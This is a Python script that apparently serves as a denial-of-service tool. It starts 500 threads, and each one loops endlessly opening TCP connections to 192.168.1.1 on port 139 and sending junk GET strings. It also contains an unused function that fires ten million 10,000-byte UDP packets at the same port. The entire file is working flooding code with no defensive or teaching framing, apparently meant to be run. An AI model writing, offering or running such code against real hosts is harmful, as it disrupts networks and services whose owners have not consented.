import os
import sys
import time
import random
import socket
import threading
from threading import Thread


class MyThread(Thread):
    
    def __init__(self, name):
        Thread.__init__(self)
        self.name = name
    
    def run(self):
        amount = random.randint(3, 10)
        time.sleep(amount)
        msg = "%s is running" % self.name
        #print(msg)
        #attack()
        dos()
 

def test(msg):
    print(msg)


def dos():
    host = "192.168.1.1"
    ip = host
    port = 139

    while True:
        #print('enter')
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"), (ip, port))

            #mysocket.send(bytes(128))
            #mysocket.sendto(bytes(128), (ip, port))

        except socket.error:
            print("error")
        mysocket.close()



def attack():
    port = 139
    host = '192.168.1.1'
    message="#I am the bestest in the world. "
    ip = socket.gethostbyname( host )
    
    ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ddos.connect((host, port))
    #ddos.sendto(bytes(512), (host, port))
    
    for i in range(10000000):
        try:
            #print('ddos!!!')
            ddos.sendto(bytes(10000), (ip, port))
        except:
            print("Connection Failed")
    
    ddos.close()

def create_threads():
    for i in range(500):
        name = "Thread #%s" % (i+1)
        my_thread = MyThread(name)
        my_thread.start()
'''
def main():
    print ("DOS app started")
    #attack()
    
    for i in range(10000000):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        t.join()
'''
    
if __name__ == "__main__":
    create_threads()
